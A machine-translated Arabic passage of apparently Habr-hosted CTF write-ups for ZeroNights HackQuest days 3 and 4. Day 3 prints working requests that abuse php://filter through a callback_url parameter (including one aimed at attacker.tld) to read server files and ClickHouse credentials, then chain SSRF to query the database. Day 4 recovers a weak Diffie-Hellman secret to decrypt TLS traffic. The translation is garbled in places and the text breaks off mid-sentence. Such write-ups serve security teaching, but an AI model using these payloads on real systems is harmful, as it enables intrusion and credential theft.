style=";text-align:right;direction:rtl"><table style=";text-align:right;direction:rtl"><tbody><tr><td align="center">  ุงููุงุฆุฒูู </td></tr><tr><td align="center">  <b>1st ููุงู</b> </td></tr><tr><td align="center">  blackfan </td></tr></tbody></table></div><br><p style=";text-align:right;direction:rtl">  ูุธููุฉ ุฃุนุฏุชูุง beched ( <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">DeteAct</a> ).  ุชู ุงุณุชูุจุงู ุงููุดุงุฑููู ูู ุฎูุงู ุตูุญุฉ ุฏูุน ุบูุฑ ููุญูุธุฉ.  ุจุงููุณุจุฉ ููุญู ุ ูุงู ูู ุงูุถุฑูุฑู ุงููุตูู ุฅูู ูุงุนุฏุฉ ุจูุงูุงุช Clickhouse ุจุงุณุชุฎุฏุงู ููุฒุฉ ุฏุงูุฉ php <code>file_get_contents</code> . </p><br><div class="spoiler" style=";text-align:right;direction:rtl">  <b class="spoiler_title">ูุฑุงุฑ ูููุฉ ุงูููู ุงูุซุงูุซ (blackfan)</b> <div class="spoiler_text" style=";text-align:right;direction:rtl"><p style=";text-align:right;direction:rtl">  ุงููููุฉ ูู ุตูุญุฉ ุฏูุน ุ ุญูุซ ูุงูุช ุงููุนููุฉ ุงูุดููุฉ ุงููุญูุฏุฉ callback_url. </p><br><p style=";text-align:right;direction:rtl"><img src="https://habrastorage.org/getpro/habr/post_images/c6c/428/f02/c6c428f02a3ea33075cbe0d5d556ace8.png" alt="https://i.imgur.com/iX65TI3.png"></p><br><p style=";text-align:right;direction:rtl">  ูุดูุฑ ุฅูู ูููุนู ูููุจู ุงูุทูุจ: </p><br><pre style=";text-align:right;direction:rtl"> <code class="plaintext hljs">http://82.202.226.176/?callback_url=http://attacker.tld/&amp;pan=&amp;amount=&amp;payment_id=</code> </pre> <br><pre style=";text-align:right;direction:rtl"> <code class="plaintext hljs">POST / HTTP/1.0 Host: attacker.tld Connection: close Content-Length: 21 Content-Type: application/json amount=0&amp;payment_id=0</code> </pre> <br><p style=";text-align:right;direction:rtl">  ูุชู ุนุฑุถ ุงุณุชุฌุงุจุฉ HTTP ููุท ุฅุฐุง ูุงู ุงููููุน ุจุฅุฑุฌุงุน ุณูุณูุฉ ุฃุจุฌุฏูุฉ ุฑูููุฉ.  ุฃูุซูุฉ ุนูู ุงูุฅุฌุงุจุงุช: </p><br><pre style=";text-align:right;direction:rtl"> <code class="plaintext hljs">{"result":"Success.","msg":"Response: testresponse"} {"result":"Invalid status code.","msg":"Non-alphanumeric response."}</code> </pre> <br><p style=";text-align:right;direction:rtl">  ูุญู ูุญุงูู ูุจูุงูุงุช callback_url: ุ ุงุฎุชุจุฑ ููููู ุ ุนูู ุงูุฃุฑุฌุญ ุ ุฃู ูุฐุง ูู PHP. </p><br><pre style=";text-align:right;direction:rtl"> <code class="plaintext hljs">http://82.202.226.176/?callback_url=data:,test&amp;pan=&amp;amount=&amp;payment_id=</code> </pre> <br><p style=";text-align:right;direction:rtl">  ูุญู ูุณุชุฎุฏู php: // filter ููุฑุงุกุฉ ุงููููุงุช ุงููุญููุฉ ูุชุฑููุฒ ุงูุงุณุชุฌุงุจุฉ ุจุงุณุชุฎุฏุงู convert.base64-encode ุจุญูุซ ุชุชุทุงุจู ุงูุฅุฌุงุจุฉ ูุน ุฃุจุฌุฏูุฉ ุฑูููุฉ.  ูุธุฑูุง ููุฃุญุฑู + ู / ู = ุ ูู ุจุนุถ ุงูุฃุญูุงู ูููู ูู ุงูุถุฑูุฑู ุฏูุฌ ุนุฏุฉ ููุงููุงุช base64 ูุนุฑุถ ุฅุฌุงุจุฉ. </p><br><pre style=";text-align:right;direction:rtl"> <code class="plaintext hljs">http://82.202.226.176/?pan=xxx&amp;amount=xxx&amp;payment_id=xxx&amp;callback_url=php://filter/convert.base64-encode|convert.base64-encode/resource=./index.php http://82.202.226.176/?pan=xxx&amp;amount=xxx&amp;payment_id=xxx&amp;callback_url=php://filter/convert.base64-encode|convert.base64-encode/resource=./includes/db.php</code> </pre> <br><pre style=";text-align:right;direction:rtl"> <code class="php hljs"><span class="hljs-meta"><span class="hljs-meta">&lt;?php</span></span> error_reporting(<span class="hljs-number"><span class="hljs-number">0</span></span>); <span class="hljs-comment"><span class="hljs-comment">/* * DB configuration */</span></span> $config = [ <span class="hljs-string"><span class="hljs-string">'host'</span></span> =&gt; <span class="hljs-string"><span class="hljs-string">'localhost'</span></span>, <span class="hljs-string"><span class="hljs-string">'port'</span></span></code> </pre> <br><p style=";text-align:right;direction:rtl">  ููุชุตุฑ ุฅุฎุฑุงุฌ ุงูุงุณุชุฌุงุจุฉ ุนูู 200 ุจุงูุช ุ ูููู ูู ุงูุฃุฌุฒุงุก ุงูุชู ูุชุนุฑู ุนูู ูุฏู ุชููุฑ ูุงุนุฏุฉ ุงูุจูุงูุงุช ุนูู ุงููุถูู ุงููุญูู.  ูููู ุจุงููุฑุฒ ุนุจุฑ ุงูููุงูุฐ ุนุจุฑ callback_url ููุฌุฏ <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">ููุงููุง ุฌุฏูุฏูุง ุนู ุงูุญูู ูู ClickHouse ุนูู ูุฏููุฉ DeteAct</a> ุ ูุงูุฐู ูุชูุงูู ูุน ุงุณู ุงููููุฉ ุงูุบุฑูุจ "HOUSE OF BECHED". </p><br><p style=";text-align:right;direction:rtl"><img src="https://habrastorage.org/getpro/habr/post_images/5fb/f00/b42/5fbf00b42a4499e928edfd469a81e755.png" alt="https://i.imgur.com/OBn22wi.png"></p><br><p style=";text-align:right;direction:rtl">  ClickHouse ูุฏูู ูุงุฌูุฉ HTTP ุงูุชู ุชุณูุญ ูู ุจุฃุฏุงุก ุทูุจุงุช ุนุดูุงุฆูุฉ ุ ูุงูุชู ูู ูุฑูุญุฉ ุฌุฏุง ููุงุณุชุฎุฏุงู ูู SSRF. </p><br><p style=";text-align:right;direction:rtl">  ููุฑุฃ ุงููุซุงุฆู ุ ูุญุงูู ุงูุญุตูู ุนูู ุญุณุงุจ ูู ุงูุชูููู. </p><br><pre style=";text-align:right;direction:rtl"> <code class="plaintext hljs">http://82.202.226.176/?callback_url=php://filter/convert.base64-encode|convert.base64-encode/resource=/etc/clickhouse-server/users.xml&amp;pan=&amp;amount=&amp;payment_id=</code> </pre> <br><pre style=";text-align:right;direction:rtl"> <code class="xml hljs"><span class="hljs-meta"><span class="hljs-meta">&lt;?xml version="1.0"?&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">yandex</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-comment"><span class="hljs-comment">&lt;!-- Profiles of settings. --&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">profiles</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-comment"><span class="hljs-comment">&lt;!-- Default settibm</span></span></code> </pre> <br><p style=";text-align:right;direction:rtl">  ูุฑุฉ ุฃุฎุฑู ุ ูุฅู ุงูุญุฏ ูู ุงููุฎุฑุฌุงุช ูุชุฏุงุฎู ุ ูุฅุฐุง ุญูููุง ูู ุฎูุงู ุงูููู ุงูููุงุณู ุ ูุฅู ุงูุญูู ุงููุทููุจ ุจุนูุฏ ููุบุงูุฉ. </p><br><p style=";text-align:right;direction:rtl"><img src="https://habrastorage.org/getpro/habr/post_images/6e8/6f9/35f/6e86f935fc695b845a63aebbbcd76626.png" alt="https://i.imgur.com/5Un6gfj.png"></p><br><p style=";text-align:right;direction:rtl">  ูุต ุงููุงุฆุถ ุจุงุณุชุฎุฏุงู ุนุงูู ุชุตููุฉ string.strip_tags. </p><br><pre style=";text-align:right;direction:rtl"> <code class="plaintext hljs">http://82.202.226.176/?callback_url=php://filter/string.strip_tags|convert.base64-encode/resource=/etc/clickhouse-server/users.xml&amp;pan=&amp;amount=&amp;payment_id=</code> </pre> <br><p style=";text-align:right;direction:rtl">  ููู ุทูู ุงูุฅุฎุฑุงุฌ ูุง ูุฒุงู ุบูุฑ ูุงูู ุญุชู ูุชู ุชููู ูููุฉ ุงููุฑูุฑ.  ุฅุถุงูุฉ ุนุงูู ุชุตููุฉ ุถุบุท zlib.deflate. </p><br><pre style=";text-align:right;direction:rtl"> <code class="plaintext hljs">http://82.202.226.176/?callback_url=php://filter/string.strip_tags|zlib.deflate|convert.base64-encode|convert.base64-encode/resource=/etc/clickhouse-server/users.xml&amp;pan=&amp;amount=&amp;payment_id=</code> </pre> <br><p style=";text-align:right;direction:rtl">  ููุฑุงุกุฉ ูุญููุง ูู ุชุฑุชูุจ ุนูุณู: </p><br><pre style=";text-align:right;direction:rtl"> <code class="php hljs"><span class="hljs-keyword"><span class="hljs-keyword">print</span></span>(file_get_contents(<span class="hljs-string"><span class="hljs-string">'php://filter/convert.base64-decode|convert.base64-decode|zlib.inflate/resource=data:,NCtYaTVWSUFBbVFTRnd1VFoyZ0FCN3hjK0JRU2tDNUt6RXZKejBXMms3QkxETkVsZUNueVNsSnFja1pxU2taK2FYRnFYbjVHYW1JQmZoZWo4a0RBeWtyZkFGME5QajBwcVdtSnBUa2xWRkNFNlJaTUVWSkZRU0JSd1JZNWxGRTFVY3NLYllVa0JiV2NFbXNGUTRYOElv'</span></span>));</code> </pre> <br><p style=";text-align:right;direction:rtl">  ุจุนุฏ ุชููู ูููุฉ ุงููุฑูุฑ ุ ูููููุง ุฅุฑุณุงู ุทูุจุงุช ClickHouse ุนูู ุงููุญู ุงูุชุงูู: </p><br><pre style=";text-align:right;direction:rtl"> <code class="plaintext hljs">http://localhost:8123/?query=select%20'xxx'&amp;user=default&amp;password=bechedhousenoheap http://default:bechedhousenoheap@localhost:8123/?query=select%20'xxx'</code> </pre> <br><p style=";text-align:right;direction:rtl">  ูููู ูุธุฑูุง ูุฃููุง ูุฑุณู POST ูู ุงูุจุฏุงูุฉ ุ ููุญู ุจุญุงุฌุฉ ุฅูู ุงูุงูุชูุงู ุนูู ุฐูู ุจุงุณุชุฎุฏุงู ุฅุนุงุฏุฉ ุงูุชูุฌูู.  ููุฏ ุชุญูู ุงูุทูุจ ุงูููุงุฆู ุจูุฐุง ุงูุดูู (ูู ูุฐู ุงููุฑุญูุฉ ููุช ุบุจูุฉ ุฌุฏูุง ุ ูุฃูู ุจุณุจุจ ุงูุชุนุดูุด ุงููุจูุฑ ูู ูุนุงูุฌุฉ ุงููุนููุงุช ุ ููุช ุจุชุฑููุฒ ุงูุฃุญุฑู ุงูุฎุงุตุฉ ุจุดูู ุบูุฑ ุตุญูุญ ููู ุฃุณุชุทุน ุชูููุฐ ุงูุทูุจ) </p><br><pre style=";text-align:right;direction:rtl"> <code class="plaintext hljs">http://82.202.226.176/?callback_url=php://filter/convert.base64-encode|convert.base64-encode|convert.base64-encode/resource=http://blackfan.ru/x?r=http://localhost:8123/%253Fquery=select%252520'xxx'%2526user=default%2526password=bechedhousenoheap&amp;pan=&amp;amount=&amp;payment_id=</code> </pre> <br><p style=";text-align:right;direction:rtl">  ุญุณููุง ุ ููุท ุงุญุตู ุนูู ุงูุจูุงูุงุช ูู ูุงุนุฏุฉ ุงูุจูุงูุงุช: </p><br><pre style=";text-align:right;direction:rtl"> <code class="sql hljs"><span class="hljs-keyword"><span class="hljs-keyword">select</span></span> <span class="hljs-keyword"><span class="hljs-keyword">name</span></span> <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> system.tables <span class="hljs-keyword"><span class="hljs-keyword">select</span></span> <span class="hljs-keyword"><span class="hljs-keyword">name</span></span> <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> system.columns <span class="hljs-keyword"><span class="hljs-keyword">where</span></span> <span class="hljs-keyword"><span class="hljs-keyword">table</span></span>=<span class="hljs-string"><span class="hljs-string">'flag4zn'</span></span> <span class="hljs-keyword"><span class="hljs-keyword">select</span></span> bechedflag <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> flag4zn</code> </pre> <br><pre style=";text-align:right;direction:rtl"> <code class="plaintext hljs">http://82.202.226.176/?callback_url=php://filter/convert.base64-encode|convert.base64-encode|convert.base64-encode/resource=http://blackfan.ru/x?r=http://localhost:8123/%253Fquery=select%252520bechedflag%252520from%252520flag4zn%2526user=default%2526password=bechedhousenoheap&amp;pan=&amp;amount=&amp;payment_id=</code> </pre> </div></div><br><h2 style=";text-align:right;direction:rtl">  ุงูููู 4. ASR-EHD </h2><br><div class="scrollable-table" style=";text-align:right;direction:rtl"><table style=";text-align:right;direction:rtl"><tbody><tr><td align="center">  ุงููุงุฆุฒูู </td></tr><tr><td align="center">  <b>1st ููุงู</b> </td></tr><tr><td align="center">  AV1ct0r </td></tr></tbody></table></div><br><p style=";text-align:right;direction:rtl">  ุชู ุฅุนุฏุงุฏ ูููุฉ ุงูููู ุงูุฑุงุจุน ูู ูุจู ูุณู ุฃุจุญุงุซ <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">ุงูุฃูู ุงูุฑููู</a> .  ูุงูุช ุงููููุฉ ุงูุฑุฆูุณูุฉ ูููููุฉ ูู ุฅุธูุงุฑ ููู ูููู ุฃู ูุคุซุฑ ุงูุงุฎุชูุงุฑ ุงูุฎุงุทุฆ ููุตุฏุฑ ุงูุฃุฑูุงู ุงูุนุดูุงุฆูุฉ ุนูู ุฎูุงุฑุฒููุฉ ุงูุชุดููุฑ.  ูู Taskka ุ ุชู ุชูููุฐ ูููุฏ ููุชุงุญ ุนุดูุงุฆู ุนุดูุงุฆู ููุชูุจ ุฐุงุชููุง ูู DH ุ ุงุณุชูุงุฏูุง ุฅูู LFSR.  ุนูุฏ ุชููู ุนุฏุฏ ูุงูู ูู ูุตุงูุญ TLS ุงููุชุชุงููุฉ ุจุงุณุชุฎุฏุงู ููู DH ุงูุนุงูุฉ ุ ูุงู ูู ุงููููู ุงุณุชุนุงุฏุฉ ุงูุญุงูุฉ ุงูุฃูููุฉ ูู LFSR ููู ุชุดููุฑ ูู ุญุฑูุฉ ุงููุฑูุฑ. </p><br><div class="spoiler" style=";text-align:right;direction:rtl">  <b class="spoiler_title">ูุฑุงุฑ ูููุฉ ุงูููู ุงูุฑุงุจุน (AV1ct0r)</b> <div class="spoiler_text" style=";text-align:right;direction:rtl"><h1 id="day-4--asr-ehd--writeup-by-av1ct0r" style=";text-align:right;direction:rtl">  ุงูููู 4 / ASR-EHD - ุจุฑูุงูุฌ WriteUp ุจูุงุณุทุฉ AV1ct0r </h1><br><p style=";text-align:right;direction:rtl">  ุจูุชุฑ ูู ุจุฌููู ุงูุนุธูุฉ: ูุณุชุฎุฏู ุฏุงุฆููุง ุงูุงุชุตุงูุงุช ุงููุดูุฑุฉ.  ููุชุฃูุฏ ูู ุฃู ุงูุฎูุงุฑุฒููุงุช ุขููุฉ ูุณุชุฎุฏู ุจูุชุฑ ุนูููู.  ุญุชู ุฃูู ูุฏู ููุง ุชูุฑูุบ ุญุฑูุฉ ุงููุฑูุฑ ุงูุฐู ุชู ุฃุซูุงุก ุงุณุชุฎุฏุงู ุงูุนููู ุงููุฎุตุต ูู.  ูู ุงุชุตุงู ุจูุชุฑ ุขูู ุญููุงุ </p><br><p style=";text-align:right;direction:rtl">  <a href="">https://hackquest.zeronights.org/downloads/task4/8Jdl3f_client.tar</a> <br>  <a href="">https://hackquest.zeronights.org/downloads/task4/d8f3ND_dump.tar</a> </p><br><ol style=";text-align:right;direction:rtl"><li style=";text-align:right;direction:rtl"><p style=";text-align:right;direction:rtl">  ุงูุชุญ ููู ุงูุนููู ูู IDA Pro ูุงูุชุดู ุฃูู ูููู ุชูุฒูู ุฌุฒุก ูู ููู flag.jpg ูู ุงูุฎุงุฏู <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">https://ssltest.a1exdandy.me:443/</a> .  ูุชู ุฃุฎุฐ ุฃู ุฌุฒุก ูู ุงูููู ูุชูุฒููู (ูู ุฃู ุจุงูุช) ูู ุณุทุฑ ุงูุฃูุงูุฑ. </p><br><pre style=";text-align:right;direction:rtl"> <code class="plaintext hljs">signed __int64 __fastcall main(int argc, char **argv, char **a3) { size_t v4; // rsi __int64 v5; // ST48_8 int v6; // [rsp+10h] [rbp-450h] int v7; // [rsp+14h] [rbp-44Ch] __int64 v8; // [rsp+20h] [rbp-440h] __int64 v9; // [rsp+28h] [rbp-438h] __int64 v10; // [rsp+30h] [rbp-430h] __int64 v11; // [rsp+38h] [rbp-428h] __int64 v12; // [rsp+40h] [rbp-420h] char ptr; // [rsp+50h] [rbp-410h] unsigned __int64 v14; // [rsp+458h] [rbp-8h] v14 = __readfsqword(0x28u); if ( argc != 3 ) return 0xFFFFFFFFLL; v6 = atoi(argv[1]); v7 = atoi(argv[2]); if ( v6 &lt; 0 || v7 &lt; 0 || v7 &lt;= v6 ) return 0xFFFFFFFFLL; v8 = 0LL; v9 = 0LL; v10 = 0LL; OPENSSL_init_ssl(0LL, 0LL); OPENSSL_init_crypto(2048LL, 0LL); v11 = ENGINE_get_default_DH(2048LL, 0LL); if ( v11 ) { if ( (unsigned int)ENGINE_init(v11) ) { v12 = ENGINE_get_DH(v11); if ( v12 ) { v8 = DH_meth_dup(v12); if ( v8 ) { if ( (unsigned int)DH_meth_set_generate_key(v8, dh_1) ) { if ( (unsigned int)ENGINE_set_DH(v11, v8) ) { v5 = TLSv1_2_client_method(v11, v8); v10 = SSL_CTX_new(v5); if ( (unsigned int)SSL_CTX_set_cipher_list(v10, "DHE-RSA-AES128-SHA256") ) { v9 = BIO_new_ssl_connect(v10); BIO_ctrl(v9, 100LL, 0LL, (__int64)"ssltest.a1exdandy.me:443"); if ( BIO_ctrl(v9, 101LL, 0LL, 0LL) &gt;= 0 ) { BIO_ctrl(v9, 101LL, 0LL, 0LL); BIO_printf(v9, "GET /flag.jpg HTTP/1.1\n", argv); BIO_printf(v9, "Host: ssltest.a1exdandy.me\n"); BIO_printf(v9, "Range: bytes=%d-%d\n\n", (unsigned int)v6, (unsigned int)v7); v4 = (signed int)BIO_read(v9, &amp;ptr, 1024LL); fwrite(&amp;ptr, v4, 1uLL, stdout); } else { v4 = 1LL; fwrite("Can't do connect\n", 1uLL, 0x11uLL, stderr); } } else { v4 = 1LL; fwrite("Can't set cipher list\n", 1uLL, 0x16uLL, stderr); } } else { v4 = 1LL; fwrite("Can't set DH methods\n", 1uLL, 0x15uLL, stderr); } } else { v4 = 1LL; fwrite("Can't set generate_key method\n", 1uLL, 0x1EuLL, stderr); } } else { v4 = 1LL; fwrite("Can't dup dh meth\n", 1uLL, 0x12uLL, stderr); } } else { v4 = 1LL; fwrite("Can't get DH\n", 1uLL, 0xDuLL, stderr); } } else { v4 = 1LL; fwrite("Can't init engine\n", 1uLL, 0x12uLL, stderr); } } else { v4 = 1LL; fwrite("Can't get DH\n", 1uLL, 0xDuLL, stderr); } if ( v11 ) { ENGINE_finish(v11, v4); ENGINE_free(v11); } if ( v8 ) DH_meth_free(v8, v4); if ( v10 ) SSL_CTX_free(v10, v4); if ( v9 ) BIO_free_all(v9, v4); return 0LL; }</code> </pre> <br><p style=";text-align:right;direction:rtl">  ูู ุชูู ููุงู ุตูุฑ ุชุญูู ุงูุนูุงูุฉ ุนูู ุงูุฎุงุฏู ุ ูููู ุชุจูู ุฃู dump.pcap ูุฏููุง ูุฌููุนุฉ ูู ุฒูุงุฑุงุช ssl ุ ูุน ูุฌูุฏ ูุทุน ูู ุงูุตูุฑุฉ.  ุจุนุฏ ุฅุฌุฑุงุก ูุญุต ุณุฑูุน ููุฎุงุฏู ูู ุฃุฌู heartbleed (ูุณุฑูุฉ ููุชุงุญ ุฎุงุต ููู ุชุดููุฑ ุญุฑูุฉ ุงููุฑูุฑ) ุ ุชุจูู ุฃู ุงูุฎุงุฏู ููุณ ุนุฑุถุฉ ููุฎุทุฑ.  ุจุงูุฅุถุงูุฉ ุฅูู ุฐูู ุ ูู ุฌูุณุงุช SSL ุ ููููุง ูุชูุฑูุบ ุญุฑูุฉ ุงููุฑูุฑ ูุงูุนููู ุ ูุชู ุงุณุชุฎุฏุงู ุงูุชุดููุฑ DHE-RSA-AES128-SHA256 ุ ุญูุซ ูุชู ุงุณุชุฎุฏุงู RSA ููุท ููุชูููุน ุ ููุชู ุชุจุงุฏู ุงูููุงุชูุญ ููููุง ููุธุงู Diffie-Hellman (ููุชุงุญ ุฎุงุฏู RSA ุฎุงุต ูู ูุฐุง ุงููุถุน ูู ูุณุงุนุฏูุง ). </p><br></li><li style=";text-align:right;direction:rtl"><p style=";text-align:right;direction:rtl">  ุจุนุฏ ูููู ูู podirbastiv ุ ูุฌุฏ ุงูุฎุงุฏู ุงูููู <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">https://ssltest.a1exdandy.me/x</a> ุ ููู ุนุจุงุฑุฉ ุนู ุจุฑูุงูุฌ ุถุงุฑ ุจุณูุท ุ ูุนููุงู ุงููุณุคูู ูุฎูุท ููู ูู 0x82C780B2697A0002 (0x82C780B2: 0x7a69 = 178.128.199.130 Opin1337).  ุนูุฏ ุงูุงุชุตุงู ุจุงููููุฐ 31337 ุ ุชุจูู ุฃู ุงูุฎุงุฏู ูุฏุนู 3 ุฃูุงูุฑ ุ ุจุนุถูุง ูุทูุจ ูุณูุทุงุช ุฅุถุงููุฉ </p><br><pre style=";text-align:right;direction:rtl"> <code class="plaintext hljs">nc 178.128.199.130 31337 Yet another fucking heap task... Command: 1-3 1 - Index: - Size: 2 - Index: 3 - Index: - Length:</code> </pre> <br><p style=";text-align:right;direction:rtl">  ูููู ูุง ูููู ุงูููุงู ุจุฃู ุดูุก ุฃูุซุฑ ูุน ูุฐุง ุงููููุฐ ุ ูุนูู ุงูุฃุฑุฌุญ ูุงูุช ูููุฉ ุตุฑู ุงูุงูุชุจุงู. </p><br></li><li style=";text-align:right;direction:rtl"><p style=";text-align:right;direction:rtl">  ุจุนุฏ ุงููุธุฑ ุจุนูุงูุฉ ุฅูู ุงูุนููู ุ ุฑุฃูุช ุฃูู ูุณุชุฎุฏู ูููุฏ ุฃุณุฑุงุฑ Diffie-Hellman ูุฎุตุต: </p><br><pre style=";text-align:right;direction:rtl"> <code class="plaintext hljs">int __fastcall rnd_work(__int64 a1) { __int64 v1; // rsi unsigned int i; // [rsp+10h] [rbp-10h] rnd_read(); BN_bin2bn(&amp;RANDOM_512, 512LL, a1); BN_lshift1(a1, a1); v1 = (unsigned int)BITS_ind[0]; // BITS_ind dd 4096, 4095, 4081, 4069, 0 if ( (unsigned int)BN_is_bit_set(a1, (unsigned int)BITS_ind[0]) ) { for ( i = 0; i &lt;= 4; ++i ) { if ( (unsigned int)BN_is_bit_set(a1, (unsigned int)BITS_ind[i]) ) { v1 = (unsigned int)BITS_ind[i]; BN_clear_bit(a1, v1); } else { v1 = (unsigned int)BITS_ind[i]; BN_set_bit(a1, v1); } } } if ( (unsigned int)((signed int)((unsigned __int64)BN_num_bits(a1) + 7) / 8) &gt; 0x200 ) { printf("Err!", v1); exit(0); } BN_bn2binpad(a1, &amp;RANDOM_512, 512LL); return rnd_write(); }</code> </pre> <br><p style=";text-align:right;direction:rtl">  ูู ุงูุจุฏุงูุฉ ุ ุชุชู ูุฑุงุกุฉ ุงูุณุฑ (512 ุจุงูุช) ูู / dev / urandom ูุญูุธู ูู ููู ุงูุญุงูุฉ.  ูุน ูู ุทูุจ ูุงุญู ุ ูุญุฏุซ ุงูุณุญุฑ ุงูุชุงูู ุจุณุฑ: </p><br><pre style=";text-align:right;direction:rtl"> <code class="plaintext hljs">XOR = 2**4096 + 2**4095 + 2**4081 + 2**4069 + 1 CMP = 2**4096 state *= 2 if state &gt; CMP: state ^= XOR</code> </pre> <br><p style=";text-align:right;direction:rtl">  ูุชู ุชุญููู ุงูุณุฑ ูุฑูู ุทููู 1 ุจุช ุฅูู ุงููุณุงุฑ ุ ูุฅุฐุง ูุงู ุงูุจุชุฉ ุงูุฃูุซุฑ ุฃูููุฉ ูู 1 ุ ูุฅู ุงูุฑูู ูููู ุซุงุจุชูุง ูู 5 ุจุชุงุช ุบูุฑ ุตูุฑูุฉ (XOR). </p><br></li></ol><br><p style=";text-align:right;direction:rtl">  ุจุงููุธุฑ ุฅูู pcap ุ ุฑุฃูุช ุฃู ูุนููุงุช Diffie-Hellman ุงูุชู ุชุตู ูู ุงูุฎุงุฏู ุซุงุจุชุฉ: </p><br><pre style=";text-align:right;direction:rtl"> <code class="plaintext hljs">dh_g = 2 dh_p =</code> </pre> <br><p style=";text-align:right;direction:rtl">  ููู ูู ูุฑุฉ ูุชู ุฅูุดุงุก ุงุชุตุงู ุ ูุฑุณู ุงูุนููู ุงูุฌุฒุก ุงูุนุงู ูู ุณุฑ Diffie-Hellman.  ุจููุงุฑูุฉ ุงูุฃุฌุฒุงุก ุงูุนุงูุฉ ูู ุฃุณุฑุงุฑ ุงูุฌูุณุงุช ุงููุฌุงูุฑุฉ ุ ููููู ุงุณุชุนุงุฏุฉ ุงูุณุฑ ุงูุฃููู ููุนููู ุ ููู ุซู ูู ุงูุฃุณุฑุงุฑ ุงููุงุญูุฉ ููู ุฌูุณุฉ: <br>  ุฅุฐุง ูุงู ุฃุนูู ุฌุฒุก ูู ุงูุณุฑ ูู 0 ุ ูุณูููู ุงูุณุฑ ูู ุงูุฌูุณุฉ ุงูุชุงููุฉ ุฃูุจุฑ ุจูุฑุชูู ุ ูุณูุชู ุชุฑุจูุน ุงูุฌุฒุก ุงูุนุงู ุจูุนุงูู p.  ูุจุงูุชุงูู ุ ูุงู ูู ุงููููู ุงุณุชุนุงุฏุฉ ุงูุณุฑ ุงูุฃููู (ูุง ุชูุช ูุฑุงุกุชู ูู / dev / urandom) mod p: </p><br><pre style=";text-align:right;direction:rtl"><code class="plaintext hljs">212030266574081313400816495535550771039880390539286135828101869037345869420205997453325815053364595553160004790759435995827592517178474188665111332189420650868610567156950459495593726196692754969821860322110444674367830706684288723400924718718744572072716445007789955072532338996543460287499773137785071615174311774659549109541904654568673143709587184128220277471318155757799759470829597214195494764332668485009525031739326801550115807698375007112649770412032760122054527000645191827995252649714951346955180619834783531787411998600610075175494746953236628125613177997145650859163985984159468674854699901927080143977813208682753148280937687469933353788992176066206254339449062166596095349440088429291135673308334245804375230115095159172312975679432750163246936266603077314220813042048063033927345613565227184333091534551071824033535159483541175958867122974738255966511008607723675431569961127852005437047813822454112416864211120323016008267853722731311026233323235121922969702016337164336853826598082855592007126727352041124911221048498141841625765390204460725231581416991152769176243658310857769293168120450725070030636638954553866903537931113666283836250525318798622872347839391197939468295124060629961250708172499966110406527347</code></pre><br><p style=";text-align:right;direction:rtl">  ููู ุงูุณูู ุญุณุงุจ ุฃุณุฑุงุฑ ุฌููุน ุงูุฌูุณุงุช ุงูุฃุฎุฑู. </p><br><p style=";text-align:right;direction:rtl">  ูููุง ูุงูุช ููุงู ูุดุงูู: <br>  ุฃ) Wireshark ุบูุฑ ูุงุฏุฑ ุนูู ูู ุชุดููุฑ SSL ุ ููุนุฑูุฉ ุฃุณุฑุงุฑ Diffie-Hellman ุ ููู ุชูู ููุงู ุญููู ุฌุงูุฒุฉ.  ูุฌุจ ุนูููุง ูุนุฑูุฉ ุงูุณุฑ ุงูุนุงู ู Diffie-Hellman (ุชูุนุฑู ุฃูุถูุง ุจุงุณู ุฌูุณุงุช ูุง ูุจู ุงููุงุฌุณุชูุฑ) ุ ูุงุณุชุฎุฏุงููุง ููุนุซูุฑ ุนูู ุฌูุณุฉ ุฑุฆูุณูุฉ ุฑุฆูุณูุฉ ุจุงุณุชุฎุฏุงู ุฏุฑุงุฌุฉ ูุจูุฑุฉ (ูุง ุฃุนุชูุฏ ุฃู ููุงู ุฏุฑุงุฌุงุช ูู SSL).  ุจุนุฏ ุฐูู ุ ููููู ุฅูุดุงุก ููู SSLKEYLOG ููุชุงุจุฉ ุนููู ุนุดูุงุฆู (ูู ูู ุฌูุณุฉ SSL) ูุงูููุชุงุญ ุงูุฑุฆูุณู ุ ูุชุญุฏูุฏู ูู ุฅุนุฏุงุฏุงุช WireShark ููู ุชุดููุฑ SSL ูุงูุฑุจุญ ูุธุฑููุง. </p><br><p style=";text-align:right;direction:rtl">  ูููู ุธูุฑุช ุจุนุถ ุงููุดููุงุช ุงูุฃุฎุฑู: <br>  B) PHP ุชุนุชุจุฑ ุจุทูุฆุฉ ุฌุฏุง (ูุง ุชุณุชุฎุฏู <code>bcadd</code> ุ ูุธุงุฆู <code>bcpowmod</code> ...) ุ ูุฑุฑุช ุฅุนุงุฏุฉ ูุชุงุจุชู ูู ุงูุซุนุจุงู. <br>  C) ูุง ูููู ุงูุนุซูุฑ ุนูู ุตูุบุฉ ุญุณุงุจ ุงูููุชุงุญ ุงูุฑุฆูุณู ุจูุงุณุทุฉ ุงูููุชุงุญ pre-master ูู ุดูู ุจุดุฑู ุ ssl ุตุนุจ ููุบุงูุฉ ุฃู ูููู ุ ูู ุฃุณุชุทุน ุงูุญุตูู ุนูู openssl ูุฅุฎุฑุงุฌ ูุชุงุฆุฌ ุงูุนูููุงุช ุงูุญุณุงุจูุฉ ุงููุณูุทุฉ ุฃูุถูุง.  ูุชูุฌุฉู ูุฐูู ุ ุงุณุชุฎุฏูุช <a href="">ูุฐุง ุงูุฑูุฒ</a> <a 